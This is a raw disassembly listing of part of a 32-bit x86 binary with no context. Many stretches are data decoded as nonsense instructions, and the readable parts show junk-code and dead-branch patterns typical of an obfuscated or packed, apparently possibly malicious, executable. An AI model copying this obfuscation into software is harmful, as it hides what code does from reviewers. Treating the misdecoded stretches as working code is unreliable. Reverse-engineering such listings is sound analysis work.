  412d35:	sub    eax,0x988b5875
  412d3a:	sbb    BYTE PTR [esi],ch
  412d3c:	cmp    DWORD PTR [edx+0x45],esp
  412d3f:	dec    ecx
  412d40:	dec    eax
  412d41:	mov    ch,BYTE PTR [edx]
  412d43:	in     al,0xac
  412d45:	push   ebx
  412d46:	scas   eax,DWORD PTR es:[edi]
  412d47:	outs   dx,DWORD PTR ds:[esi]
  412d48:	cmp    al,0xbc
  412d4a:	fcmovne st,st(4)
  412d4c:	jp     0x412d6e
  412d4e:	push   edi
  412d4f:	jnp    0x412d7d
  412d51:	nop
  412d52:	not    DWORD PTR [edi+esi*4-0x5b]
  412d56:	jbe    0x412d61
  412d58:	loopne 0x412ced
  412d5a:	cli    
  412d5b:	jmp    0xe2fa:0x3a742090
  412d62:	iret   
  412d63:	mov    BYTE PTR [edi-0x6c],0xe0
  412d67:	call   0x369a7411
  412d6c:	push   ecx
  412d6d:	mov    ds:0xf4cdcee3,eax
  412d72:	sbb    al,0x4f
  412d74:	(bad)  
  412d75:	xor    al,0xae
  412d77:	xor    BYTE PTR [edi],ch
  412d79:	and    eax,DWORD PTR ds:0xd355
  412d7e:	inc    esi
  412d7f:	pop    ebx
  412d80:	mov    bl,0x5f
  412d82:	lods   eax,DWORD PTR ds:[esi]
  412d83:	add    dl,BYTE PTR [ecx-0x6d]
  412d86:	mov    WORD PTR [eax-0x2099c6d6],cs
  412d8c:	dec    ebp
  412d8d:	mov    BYTE PTR [esi+ebp*2-0x1a],bh
  412d91:	mov    DWORD PTR [ecx],edx
  412d93:	popf   
  412d94:	outs   dx,BYTE PTR ds:[esi]
  412d95:	leave  
  412d96:	add    al,0x59
  412d98:	pop    edi
  412d99:	inc    esi
  412d9a:	push   ecx
  412d9b:	(bad)  
  412d9c:	push   edx
  412d9d:	repz repnz arpl WORD PTR [edi+eax*1-0x5a],si
  412da3:	stos   BYTE PTR es:[edi],al
  412da4:	add    ebp,eax
  412da6:	jp     0x412df8
  412da8:	ja     0x412dc1
  412daa:	(bad)  [eax+edi*8-0x3e]
  412dae:	jno    0x412deb
  412db0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412db1:	in     eax,dx
  412db2:	or     DWORD PTR [eax+0x7940238a],ecx
  412db8:	nop
  412db9:	and    cl,BYTE PTR [edx+0x7f0acc3d]
  412dbf:	sub    al,0x76
  412dc1:	add    eax,0xa769b63d
  412dc6:	lahf   
  412dc7:	mov    dl,0x15
  412dc9:	fst    DWORD PTR ds:0xb73d6850
  412dcf:	cmp    eax,eax
  412dd1:	mov    edi,0xc37e2c4a
  412dd6:	out    dx,al
  412dd7:	out    dx,al
  412dd8:	aad    0xd3
  412dda:	jmp    0x5748edb0
  412ddf:	sub    eax,0xe5e62d8
  412de4:	or     DWORD PTR [edx],edi
  412de6:	cmp    edi,DWORD PTR [esi+0x18c1fe42]
  412dec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ded:	stos   BYTE PTR es:[edi],al
  412dee:	out    dx,al
  412def:	mov    al,ds:0x4d87be34
  412df4:	iret   
  412df5:	data16 jo 0x412df7
  412df8:	lods   al,BYTE PTR ds:[esi]
  412df9:	dec    eax
  412dfa:	sbb    ah,BYTE PTR [ebp+0x2d]
  412dfd:	gs sahf 
  412dff:	jl     0x412de2
  412e01:	xchg   BYTE PTR [edi-0x77],bh
  412e04:	pusha  
  412e05:	js     0x412e0c
  412e07:	pop    edx
  412e08:	inc    eax
  412e09:	js     0x412e06
  412e0b:	inc    esi
  412e0c:	jnp    0x412d97
  412e0e:	pop    esi
  412e0f:	mov    esi,0xc8b31cbc
  412e14:	repnz mov WORD PTR [ebx+0x41f88680],ds
  412e1b:	fwait
  412e1c:	xor    bl,bl
  412e1e:	push   edi
  412e1f:	fidivr DWORD PTR [edi]
  412e21:	dec    edx
  412e22:	imul   eax,DWORD PTR [edx],0xfffffff4
  412e25:	or     edx,DWORD PTR [ebx-0x4512a40d]
  412e2b:	(bad)  
  412e2c:	fdivr  DWORD PTR [eax+0x9]
  412e2f:	clc    
  412e30:	sub    edx,DWORD PTR ss:[esi]
  412e33:	cdq    
  412e34:	and    DWORD PTR [eax+edi*2],ecx
  412e37:	loop   0x412e9e
  412e39:	cwde   
  412e3a:	test   BYTE PTR [ebx-0x11],ch
  412e3d:	sbb    esi,edx
  412e3f:	mov    esi,0x699ce853
  412e44:	jecxz  0x412e43
  412e46:	push   0xffffffd1
  412e48:	jmp    0x7c67:0x6860c403
  412e4f:	hlt    
  412e50:	xchg   ebx,eax
  412e51:	cmp    DWORD PTR [edi-0x2e0d3dbc],edi
  412e57:	mov    al,ds:0x55db1c91
  412e5c:	jg     0x412e43
  412e5e:	shl    DWORD PTR [eax-0xfffc4a1],cl
  412e64:	pop    esp
  412e65:	jns    0x412e3c
  412e67:	pop    edi
  412e68:	xlat   BYTE PTR ds:[ebx]
  412e69:	cwde   
  412e6a:	mov    bh,0xb3
  412e6c:	xchg   cl,ah
  412e6e:	fadd   DWORD PTR [ebx]
  412e70:	jl     0x412e57
  412e72:	out    0x78,eax
  412e74:	jbe    0x411bd8
  412e7a:	pop    edi
  412e7b:	pop    esi
  412e7c:	pop    ebx
  412e7d:	leave  
  412e7e:	ret    0xc
  412e81:	push   ebp
  412e82:	mov    ebp,esp
  412e84:	sub    esp,0x80
  412e8a:	push   ebx
  412e8b:	push   esi
  412e8c:	push   edi
  412e8d:	mov    eax,DWORD PTR [ebp+0x8]
  412e90:	and    esi,edi
  412e92:	mov    ecx,DWORD PTR [ebp+0xc]
  412e95:	and    esi,esi
  412e97:	shrd   eax,ecx,0x2
  412e9b:	shr    ecx,0x2
  412e9e:	and    DWORD PTR ds:0x42819d,0x3e79
  412ea8:	mov    ecx,DWORD PTR [ebp+0x8]
  412eab:	or     ebx,DWORD PTR ds:0x4281a1
  412eb1:	mov    edx,DWORD PTR [ebp+0xc]
  412eb4:	neg    esi
  412eb6:	xor    edx,edx
  412eb8:	cmp    DWORD PTR ds:0x428281,0x0
  412ebf:	mov    DWORD PTR ds:0x428241,0x5e43
  412ec9:	mov    edi,0x724a
  412ece:	movzx  esi,WORD PTR ds:0x4282c9
  412ed5:	mov    DWORD PTR ds:0x428209,edi
  412edb:	jmp    0x412f2b
  412ee0:	mov    edi,DWORD PTR ds:0x428289
  412ee6:	mov    edi,DWORD PTR ds:0x4282c5
  412eec:	cmp    DWORD PTR ds:0x428281,0x0
  412ef3:	jg     0x412f13
  412ef9:	push   DWORD PTR [ebp-0xc]
  412efc:	push   DWORD PTR [ebp-0x1c]
  412eff:	push   DWORD PTR [ebp-0x1c]
  412f02:	push   DWORD PTR [ebp-0x14]
  412f05:	call   DWORD PTR ds:0x428ab4
  412f0b:	or     ebx,DWORD PTR ds:0x428285
  412f11:	xor    esi,ebx
  412f13:	mov    edi,DWORD PTR ds:0x4281a1
  412f19:	sbb    edi,DWORD PTR ds:0x4282c9
  412f1f:	mov    DWORD PTR ds:0x4281a1,edi
  412f25:	xor    DWORD PTR ds:0x428279,edi
  412f2b:	mov    esi,0x32e26d9d
  412f30:	xor    eax,esi
  412f32:	or     eax,edx
  412f34:	sbb    edx,edx
  412f36:	mov    DWORD PTR [ebp-0x34],eax
  412f39:	mov    eax,DWORD PTR [ebp+0x8]
  412f3c:	jmp    0x4132c6
  412f41:	lods   al,BYTE PTR ds:[esi]
  412f42:	cmp    DWORD PTR [edx],edi
  412f44:	xchg   ebp,eax
  412f45:	dec    edi
  412f46:	mov    ebp,0xbeff39bd
  412f4b:	popf   
  412f4c:	outs   dx,DWORD PTR ds:[esi]
  412f4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f4e:	adc    BYTE PTR [ecx-0x44804a05],0xbb
  412f55:	nop
  412f56:	lds    edi,FWORD PTR [ebx+0x5d57abb]
  412f5c:	or     BYTE PTR [esi],ch
  412f5e:	mov    esi,0x3952eb71
  412f63:	dec    eax
  412f64:	rcl    bl,cl
  412f66:	push   esp
  412f67:	xchg   edx,eax
  412f68:	pop    edx
  412f69:	clc    
  412f6a:	repnz push ebx
  412f6c:	cmp    cl,ch
  412f6e:	idiv   BYTE PTR [edx+0x68bc577b]
  412f74:	inc    edx
  412f75:	sar    DWORD PTR ds:0x5286bd55,1
  412f7b:	mov    eax,ds:0xd5eadd51
  412f80:	mov    bl,0x41
  412f82:	pop    ss
  412f83:	adc    DWORD PTR [edi+0x24],ecx
  412f86:	fwait
  412f87:	hlt    
  412f88:	fbld   TBYTE PTR [edx]
  412f8a:	rcr    DWORD PTR [esi+0x2ddd1066],0xe3
  412f91:	inc    edi
  412f92:	push   es
  412f93:	sub    eax,DWORD PTR [ecx+0x9]
  412f96:	dec    esi
  412f97:	mov    al,ds:0x5c018e7b
  412f9c:	sub    esp,DWORD PTR [edx-0x7c]
  412f9f:	add    eax,0x25ca5cff
  412fa4:	clc    
  412fa5:	je     0x412ff6
  412fa7:	sbb    eax,0xc4d74696
  412fac:	int3   
  412fad:	int    0xed
  412faf:	retf   
  412fb0:	jp     0x412fe3
  412fb2:	cmp    BYTE PTR [ecx],al
  412fb4:	pop    ebp
  412fb5:	fwait
  412fb6:	sahf   
  412fb7:	sbb    ch,dh
  412fb9:	idiv   dx
  412fbc:	mov    ah,al
  412fbe:	xor    al,0x5b
  412fc0:	sbb    DWORD PTR ds:0xaa042288,eax
  412fc6:	loop   0x412f72
  412fc8:	jg     0x412f95
  412fca:	cdq    
  412fcb:	les    ecx,FWORD PTR [edx-0x40]
  412fce:	popa   
  412fcf:	jp     0x412fac
  412fd1:	mov    WORD PTR [eax],?
  412fd3:	sub    esp,DWORD PTR [esi]
  412fd5:	mov    ebp,0x30510c69
  412fda:	mov    BYTE PTR cs:[ebp-0x23e9cea9],ah
  412fe1:	ret    
  412fe2:	ja     0x413008
  412fe4:	xor    DWORD PTR [esi+eax*4],ebp
  412fe7:	mov    ecx,0xa12d0f21
  412fec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412fed:	clc    
  412fee:	out    dx,eax
  412fef:	int3   
  412ff0:	jg     0x412f88
  412ff2:	not    BYTE PTR [edi+0x6]
  412ff5:	cmc    
  412ff6:	daa    
  412ff7:	cwde   
  412ff8:	leave  
  412ff9:	pop    ds
  412ffa:	out    dx,al
  412ffb:	mov    edi,0x3fa46f79
  413000:	ficomp DWORD PTR [edx-0x2c]
  413003:	or     BYTE PTR [esi-0x46],0x8
  413007:	and    eax,0x1ccc7763
  41300c:	(bad)  
  41300d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41300e:	test   BYTE PTR [ebp-0x4a],0xac
  413012:	lahf   
  413013:	xchg   BYTE PTR [edx],dl
  413015:	pop    ebx
  413016:	(bad)  
  413017:	fld    QWORD PTR ds:0x3ea03e15
  41301d:	icebp  
  41301e:	inc    esp
  41301f:	xor    al,0xc4
  413021:	xchg   esp,ecx
  413023:	adc    DWORD PTR [esi-0x6a],esp
  413026:	pop    es
  413027:	or     edi,DWORD PTR [edx]
  413029:	mov    cl,0xb
  41302b:	push   ecx
  41302c:	stos   BYTE PTR es:[edi],al
  41302d:	call   0x2d146eea
  413032:	mov    edx,0x70634866
  413037:	sub    al,0x5b
  413039:	imul   ebp,ebp,0x4e
  41303c:	and    edi,DWORD PTR [esi]
  41303e:	imul   edi,DWORD PTR [edi],0xffffffb8
  413041:	or     al,0x73
  413043:	scas   al,BYTE PTR es:[edi]
  413044:	or     edx,DWORD PTR [eax+0x9e8c08a]
  41304a:	jge    0x413066
  41304c:	jl     0x413085
  41304e:	jmp    0x413075
  413050:	jmp    0x3050:0xfa22725f
  413057:	fcom   DWORD PTR [edx+0x6f6190cd]
  41305e:	xor    al,0xa3
  413060:	retf   0xaa68
  413063:	push   eax
  413064:	enter  0xebbd,0x90
  413068:	jg     0x413056
  41306a:	enter  0x5e4,0x81
  41306e:	in     al,0xcf
  413070:	push   0x20e114bb
  413075:	sub    ecx,DWORD PTR [ecx+0x37]
  413078:	pusha  
  413079:	or     dl,BYTE PTR [ebx-0x31]
  41307c:	fld    DWORD PTR [edx+0x59]
  41307f:	pusha  
  413080:	into   
  413081:	loop   0x413095
  413083:	fadd   QWORD PTR [esp+eax*2+0x6e]
  413087:	and    BYTE PTR [esi-0x48],dl
  41308a:	mov    ds:0x1bf1cae4,al
  41308f:	sar    DWORD PTR [ebp-0x429dddf3],cl
  413095:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413096:	sbb    esp,esp
  413098:	sbb    ah,bh
  41309a:	dec    edi
  41309b:	and    ebp,DWORD PTR [ecx]
  41309d:	xor    eax,0x4ab03eb2
  4130a2:	leave  
  4130a3:	bound  edi,QWORD PTR [eax+0x7cda1629]
  4130a9:	cmp    edi,ecx
  4130ab:	repz and al,0xee
  4130ae:	lods   eax,DWORD PTR ds:[esi]
  4130af:	mov    eax,ds:0xac99a1d2
  4130b4:	hlt    
  4130b5:	pop    ss
  4130b6:	inc    edi
  4130b7:	sbb    eax,0x537c0873
  4130bc:	fwait
  4130bd:	xchg   edx,eax
  4130be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4130bf:	adc    BYTE PTR [edx],cl
  4130c1:	rcr    DWORD PTR [ecx],0x62
  4130c4:	mov    ds:0x945ba5d4,eax
  4130c9:	test   BYTE PTR [edi+0xa],bh
  4130cc:	(bad)  
  4130cd:	jmp    0xf28e:0x4bf4a0e0
  4130d4:	dec    esi
  4130d5:	fimul  WORD PTR [ebx-0x233dcbb1]
  4130db:	aaa    
  4130dc:	int    0x63
  4130de:	inc    eax
  4130df:	aaa    
  4130e0:	xor    eax,0x719fb69a
  4130e5:	aaa    
  4130e6:	mov    bl,0xc8
  4130e8:	and    bh,BYTE PTR [ecx]
  4130ea:	cli    
  4130eb:	shl    BYTE PTR [ebx-0x6c73fc6f],1
  4130f1:	add    DWORD PTR ss:[esi+0x37],eax
  4130f5:	sbb    al,0xba
  4130f7:	pop    ss
  4130f8:	mov    ds:0xd1ca4a3,eax
  4130fd:	loope  0x4130b1
  4130ff:	sti    
  413100:	pop    ss
  413101:	mov    al,ds:0xc48e4693
  413106:	jmp    0x95fd5c5
  41310b:	in     al,0x18
  41310d:	int    0xc2
  41310f:	dec    ebx
  413110:	push   ecx
  413111:	ins    DWORD PTR es:[edi],dx
  413112:	and    al,dh
  413114:	call   0x39216c58
  413119:	test   eax,0x13a207c8
  41311e:	ror    edx,1
  413120:	test   al,0xf9
  413122:	push   esp
  413123:	bound  esp,QWORD PTR ds:0x87747d79
  413129:	stos   DWORD PTR es:[edi],eax
  41312a:	mov    ?,WORD PTR [ecx-0x3]
  41312d:	or     DWORD PTR [ebp-0x1a],esi
  413130:	sub    esi,ebx
  413132:	ss mov dl,dh
  413135:	mov    cl,0xb4
  413137:	push   ebx
  413138:	lock inc esi
  41313a:	shl    BYTE PTR [edi+0x6c211bb3],cl
  413140:	std    
  413141:	gs into 
  413143:	ja     0x4131be
  413145:	dec    ebx
  413146:	jnp    0x413194
  413148:	ret    
  413149:	std    
  41314a:	imul   BYTE PTR [ebp+0x55]
  41314d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41314e:	xor    eax,0xa2fb3128
  413153:	aam    0x7d
  413155:	arpl   WORD PTR [ebx+0x5e],ax
  413158:	cmp    eax,0xf377a7a3
  41315d:	jnp    0x413103
  41315f:	xor    al,0x61
  413161:	add    DWORD PTR [edx-0xd],ecx
  413164:	or     ecx,esi
  413166:	div    DWORD PTR [ebp+0x4a]
  413169:	lods   al,BYTE PTR es:[esi]
  41316b:	lahf   
  41316c:	add    DWORD PTR [edx+ebx*8],edx
  41316f:	leave  
  413170:	in     eax,dx
  413171:	fsub   QWORD PTR [edi-0x27]
  413174:	cld    
  413175:	or     DWORD PTR [ebx-0x6693b668],esp
  41317b:	jbe    0x413151
  41317d:	adc    eax,0x9cc18073
  413182:	lds    esp,FWORD PTR [ebp+0x7b]
  413185:	cmp    ebp,DWORD PTR [esi+0x25367833]
  41318b:	das    
  41318c:	mov    esp,0x6ab5d9da
  413191:	shl    BYTE PTR ds:0x22299815,0xbb
  413198:	into   
  413199:	retf   0x92e
  41319c:	xlat   BYTE PTR ds:[ebx]
  41319d:	pop    edi
  41319e:	ins    DWORD PTR es:[edi],dx
  41319f:	into   
  4131a0:	lahf   
  4131a1:	gs hlt 
  4131a3:	test   DWORD PTR [edi-0x42],edx
  4131a6:	cmp    dl,ch
  4131a8:	and    al,0x62
  4131aa:	sub    bh,ah
  4131ac:	jbe    0x413222
  4131ae:	rol    DWORD PTR [ebx],cl
  4131b0:	xlat   BYTE PTR ds:[ebx]
  4131b1:	sbb    eax,0xef91838
  4131b6:	dec    ebp
  4131b7:	mov    dl,0xc7
  4131b9:	inc    edx
  4131ba:	dec    ebp
  4131bb:	or     al,0x78
  4131bd:	mov    ah,0xaa
  4131bf:	and    eax,0x55c188d
  4131c4:	push   ecx
  4131c5:	and    bh,ah
  4131c7:	addr16 add esi,0x3bcaf5
  4131ce:	aas    
  4131cf:	lods   al,BYTE PTR ds:[esi]
  4131d0:	mov    cl,0x17
  4131d2:	cmp    ah,bl
  4131d4:	cmc    
  4131d5:	les    ebx,FWORD PTR [esi-0x68432b03]
  4131db:	fldenv [edi-0x3a]
  4131de:	cmc    
  4131df:	sub    DWORD PTR [ecx-0x28],ebx
  4131e2:	mov    edx,0x8c7a980e
  4131e7:	popf   
  4131e8:	pop    edi
  4131e9:	mov    cl,0x44
  4131eb:	jns    0x413246
  4131ed:	push   ebx
  4131ee:	sub    al,0x61
  4131f0:	test   BYTE PTR [ecx+0x456a2b75],bh
  4131f6:	lea    ebx,[ebp+0x6bd4c882]
  4131fc:	ds or  eax,0x27d3338b
  413202:	adc    bh,bh
  413204:	(bad)  [edi+0xb4aecd4]
  41320a:	sub    al,BYTE PTR cs:[edi-0x33]
  41320e:	sub    DWORD PTR [edi],edi
  413210:	call   0xe61677f3
  413215:	add    ch,0x4d
  413218:	push   edi
  413219:	mov    esp,es
  41321b:	mov    WORD PTR [ebx*1-0x3ddbd79b],?
  413222:	xchg   dl,bl
  413224:	sub    BYTE PTR ds:0x2fcd9f7c,ch
  41322a:	jl     0x413223
  41322c:	fadd   QWORD PTR [edi+ecx*8]
  41322f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413230:	das    
  413231:	or     edi,ebx
  413233:	aad    0x35
  413235:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413236:	jnp    0x413201
  413238:	sbb    ah,bl
  41323a:	pop    es
  41323b:	sub    ebx,DWORD PTR [ebx+ebx*4-0x32104e5d]
  413242:	jg     0x4131f5
  413244:	mov    esp,DWORD PTR [edi-0x1ae9cb1c]
  41324a:	ds pop ss
  41324c:	jl     0x4132c8
  41324e:	fsubr  QWORD PTR [ecx]
  413250:	mov    dl,0x87
  413252:	xor    al,0x22
  413254:	test   BYTE PTR [edi-0x778b609d],bl
  41325a:	pop    ds
  41325b:	rcr    ebx,0x9a
  41325e:	call   FWORD PTR [edx+0x31]
  413261:	lock cmc 
  413263:	cmp    esi,edi
  413265:	fisttp WORD PTR [eax]
  413267:	(bad)  
  413268:	fbstp  TBYTE PTR [esi-0x26]
  41326b:	mov    DWORD PTR [edx+0x51462014],eax
  413271:	jge    0x413227
  413273:	lods   al,BYTE PTR ds:[esi]
  413274:	mov    esi,0x37cab6ad
  413279:	xchg   DWORD PTR [esi],edi
  41327b:	pop    eax
  41327c:	in     al,dx
  41327d:	fwait
  41327e:	add    al,BYTE PTR [edx+0x30d14a42]
  413284:	cwde   
  413285:	add    DWORD PTR [esi-0x54],eax
  413288:	stc    
  413289:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41328a:	fmul   QWORD PTR [eax]
  41328c:	cmp    eax,DWORD PTR [eax]
  41328e:	fild   QWORD PTR [eax+0x42aec546]
  413294:	mov    edx,DWORD PTR [ebx+0x25]
  413297:	push   ebx
  413298:	rcr    BYTE PTR [edx-0x54],1
  41329b:	scas   al,BYTE PTR es:[edi]
  41329c:	jge    0x4132ee
  41329e:	sahf   
  41329f:	lods   eax,DWORD PTR ds:[esi]
  4132a0:	inc    esp
  4132a1:	leave  
  4132a2:	adc    DWORD PTR [eax-0x52],edx
  4132a5:	mov    WORD PTR [ebp+0x6c],ss
  4132a8:	adc    ebp,DWORD PTR [eax+0xc]
  4132ab:	xchg   ah,bl
  4132ad:	pextrw ebp,(bad),0xc5
  4132af:	outs   dx,BYTE PTR ds:[esi]
  4132b0:	(bad)  
  4132b2:	mov    DWORD PTR [eax],0x2e77f74
  4132b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4132b9:	adc    al,BYTE PTR [esi]
  4132bb:	mov    ecx,0x74761c90
  4132c0:	sub    BYTE PTR [eax],bl
  4132c2:	cli    
  4132c3:	mov    eax,ds:0xe1c1fb20
  4132c8:	push   ds
  4132c9:	mov    ecx,DWORD PTR [ebp+0xc]
  4132cc:	shrd   eax,ecx,0x2
  4132d0:	xor    eax,esi
  4132d2:	or     edx,edx
  4132d4:	shr    ecx,0x2
  4132d7:	and    ebx,edi
  4132d9:	mov    ecx,DWORD PTR [ebp+0x8]
  4132dc:	mov    edx,DWORD PTR [ebp+0xc]
  4132df:	xor    edx,edx
  4132e1:	mov    ebx,DWORD PTR ds:0x4281cd
  4132e7:	xor    edi,edi
  4132e9:	add    edi,DWORD PTR ds:0x428291
  4132ef:	sub    edi,ebx
  4132f1:	xor    ebx,DWORD PTR [ebx+edi*1]
  4132f4:	or     eax,edx
  4132f6:	add    edx,edi
  4132f8:	mov    DWORD PTR [ebp-0x34],eax
  4132fb:	mov    eax,ds:0x422128
  413300:	mov    ebx,DWORD PTR ds:0x4282bd
  413306:	sbb    DWORD PTR ds:0x428231,ebx
  41330c:	mov    eax,DWORD PTR [eax]
  41330e:	mov    DWORD PTR [ebp-0x28],eax
  413311:	add    edx,DWORD PTR ds:0x4281fd
  413317:	mov    eax,ds:0x422348
  41331c:	mov    eax,DWORD PTR [eax]
  41331e:	xor    DWORD PTR ds:0x4282c5,0x2aba
  413328:	mov    DWORD PTR [ebp-0x20],eax
  41332b:	adc    ebx,ebx
  41332d:	mov    eax,DWORD PTR [ebp-0x28]
  413330:	and    edi,eax
  413332:	mov    eax,DWORD PTR [ebp-0x28]
  413335:	mov    ebx,DWORD PTR [ebp+0x8]
  413338:	adc    DWORD PTR ds:0x42822d,edi
  41333e:	shl    ecx,0x1e
  413341:	xor    ecx,ecx
  413343:	add    DWORD PTR ds:0x428289,0x33fe
  41334d:	shld   ecx,eax,0x2
  413351:	mov    edx,DWORD PTR ds:0x42819d
  413357:	adc    DWORD PTR ds:0x4282d1,edx
  41335d:	shl    eax,0x2
  413360:	mov    edi,DWORD PTR ds:0x42825d
  413366:	mov    edx,DWORD PTR ds:0x428291
  41336c:	sub    edx,edi
  41336e:	or     edi,DWORD PTR [edi+edx*1]
  413371:	mov    edi,0xcb89b676
  413376:	neg    edx
  413378:	mov    edx,0x9d2b8af8
  41337d:	mov    DWORD PTR [ebp-0x10],ebx
  413380:	cmp    DWORD PTR ds:0x428239,0x0
  413387:	mov    ebx,0x66fb
  41338c:	mov    DWORD PTR ds:0x428281,edx
  413392:	jmp    0x4133f5
  413397:	mov    ebx,DWORD PTR ds:0x428229
  41339d:	mov    DWORD PTR ds:0x4281b1,edi
  4133a3:	cmp    DWORD PTR ds:0x428239,0x0
  4133aa:	jg     0x4133e9
  4133b0:	push   0x428211
  4133b5:	push   0x428289
  4133ba:	push   0x42827d
  4133bf:	call   DWORD PTR ds:0x428a74
  4133c5:	mov    ebx,DWORD PTR ds:0x42823d
  4133cb:	add    ebx,DWORD PTR ds:0x428271
  4133d1:	mov    DWORD PTR ds:0x42823d,ebx
  4133d7:	neg    ebx
  4133d9:	sbb    DWORD PTR ds:0x42826d,edx
  4133df:	adc    DWORD PTR ds:0x4281a9,0x2247
  4133e9:	xor    ebx,0x1f46
  4133ef:	add    ebx,DWORD PTR ds:0x4282b9
  4133f5:	mov    ebx,DWORD PTR [ebp+0xc]
  4133f8:	or     DWORD PTR ds:0x428241,0x26a5
  413402:	xor    eax,edi
  413404:	not    DWORD PTR ds:0x4282b5
  41340a:	xor    ecx,edx
  41340c:	mov    DWORD PTR ds:0x428191,0x41f0
  413416:	mov    DWORD PTR [ebp-0x18],0xa6069dae
  41341d:	mov    DWORD PTR [ebp-0x1c],0xa60694ae
  413424:	mov    DWORD PTR [ebp-0xc],ebx
  413427:	mov    DWORD PTR ds:0x42823d,0x7cc
  413431:	cmp    eax,DWORD PTR [ebp-0x10]
  413434:	jne    0x413456
  41343a:	mov    DWORD PTR ds:0x428209,0x2832
  413444:	cmp    ecx,ebx
  413446:	mov    DWORD PTR ds:0x42819d,0x45a1
  413450:	je     0x416dda
  413456:	cmp    DWORD PTR ds:0x428275,0x0
  41345d:	mov    DWORD PTR ds:0x428235,0x685
  413467:	mov    DWORD PTR ds:0x428239,0x3f52
  413471:	mov    DWORD PTR ds:0x4281a5,edi
  413477:	jmp    0x4134d6
  41347c:	mov    DWORD PTR ds:0x428211,0x406f
  413486:	mov    DWORD PTR ds:0x4281b1,0x468a
  413490:	cmp    DWORD PTR ds:0x428275,0x0
  413497:	jg     0x4134c2
  41349d:	push   0x10b9
  4134a2:	call   DWORD PTR ds:0x428a78
  4134a8:	sub    DWORD PTR ds:0x428195,0x428235
  4134b2:	sub    DWORD PTR ds:0x4282c9,edx
  4134b8:	xor    DWORD PTR ds:0x4282d1,0x75c2
  4134c2:	add    DWORD PTR ds:0x4282c5,0x428229
  4134cc:	sub    DWORD PTR ds:0x4282b9,0x2b57
  4134d6:	mov    eax,DWORD PTR [ebp-0x20]
  4134d9:	cmp    DWORD PTR ds:0x42821d,0x0
  4134e0:	mov    DWORD PTR ds:0x428219,ecx
  4134e6:	mov    DWORD PTR ds:0x4281ad,ecx
  4134ec:	mov    DWORD PTR ds:0x428269,0x2bd8
  4134f6:	jmp    0x41354f
  4134fb:	mov    DWORD PTR ds:0x4282d1,0x1a9a
  413505:	cmp    DWORD PTR ds:0x42821d,0x0
  41350c:	jne    0x41352f
  413512:	push   DWORD PTR [ebp-0xc]
  413515:	call   DWORD PTR ds:0x4289e0
  41351b:	sub    DWORD PTR ds:0x428221,0x4282b1
  413525:	mov    DWORD PTR ds:0x4282c1,0x5913
  41352f:	sub    DWORD PTR ds:0x4281a1,edx
  413535:	adc    DWORD PTR ds:0x428201,0x4282c1
  41353f:	adc    DWORD PTR ds:0x428281,0x428241
  413549:	sub    DWORD PTR ds:0x42827d,ecx
  41354f:	mov    eax,DWORD PTR [ebp-0x20]
  413552:	add    DWORD PTR ds:0x428231,0x4281fd
  41355c:	xor    ecx,ecx
  41355e:	sub    DWORD PTR ds:0x428285,0x428239
  413568:	shld   ecx,eax,0x2
  41356c:	shl    eax,0x2
  41356f:	xor    ecx,edx
  413571:	cmp    DWORD PTR ds:0x428229,0x0
  413578:	mov    DWORD PTR ds:0x428195,edx
  41357e:	mov    edx,0x1314
  413583:	jmp    0x4135ec
  413588:	mov    DWORD PTR ds:0x42822d,0x61b4
  413592:	mov    DWORD PTR ds:0x428279,0x1bfb
  41359c:	cmp    DWORD PTR ds:0x428229,0x0
  4135a3:	jbe    0x4135cd
  4135a9:	push   0x1040
  4135ae:	call   DWORD PTR ds:0x428ab8
  4135b4:	sub    edx,DWORD PTR ds:0x42821d
  4135ba:	and    edx,0x21ff
  4135c0:	movzx  edx,WORD PTR ds:0x4282b1
  4135c7:	add    DWORD PTR ds:0x42822d,edx
  4135cd:	dec    edx
  4135ce:	and    DWORD PTR ds:0x428231,ecx
  4135d4:	xor    edx,DWORD PTR ds:0x428191
  4135da:	mov    edx,DWORD PTR ds:0x4282b5
  4135e0:	add    DWORD PTR ds:0x4282b1,edx
  4135e6:	or     DWORD PTR ds:0x428219,ebx
  4135ec:	mov    edx,DWORD PTR [ebp+0x8]
  4135ef:	xor    eax,edi
  4135f1:	mov    DWORD PTR ds:0x4282c5,edx
  4135f7:	mov    edi,DWORD PTR [ebp+0xc]
  4135fa:	mov    DWORD PTR ds:0x4282b9,0x7cec
  413604:	cmp    eax,edx
  413606:	mov    DWORD PTR ds:0x428211,0x6c7a
  413610:	jne    0x413628
  413616:	mov    DWORD PTR ds:0x4281a9,0x55f1
  413620:	cmp    ecx,edi
  413622:	je     0x416dda
  413628:	cmp    DWORD PTR ds:0x428269,0x0
  41362f:	mov    ecx,0x5fb6
  413634:	mov    DWORD PTR ds:0x428275,0xb21
  41363e:	mov    ecx,DWORD PTR ds:0x4281a1
  413644:	jmp    0x41367e
  413649:	mov    edi,0x3f38
  41364e:	mov    DWORD PTR ds:0x428209,ebx
  413654:	cmp    DWORD PTR ds:0x428269,0x0
  41365b:	je     0x41367a
  413661:	push   DWORD PTR [ebp-0xc]
  413664:	push   DWORD PTR [ebp-0x14]
  413667:	push   DWORD PTR [ebp-0x10]
  41366a:	push   DWORD PTR [ebp-0x10]
  41366d:	call   DWORD PTR ds:0x4289e4
  413673:	sbb    ebx,DWORD PTR ds:0x428221
  413679:	inc    ebx
  41367a:	sub    ecx,ebx
  41367c:	and    ecx,ecx
  41367e:	mov    eax,DWORD PTR [ebp-0x1c]
  413681:	mov    ecx,DWORD PTR [ebp-0x1c]
  413684:	movzx  ebx,WORD PTR ds:0x428281
  41368b:	add    DWORD PTR ds:0x4282b9,ebx
  413691:	push   0xfffffffe
  413693:	not    DWORD PTR ds:0x4282bd
  413699:	jmp    0x413a23
  41369e:	xor    DWORD PTR [ecx-0x73],esp
  4136a1:	je     0x413640
  4136a3:	mov    esp,0xda9a539
  4136a8:	inc    ebp
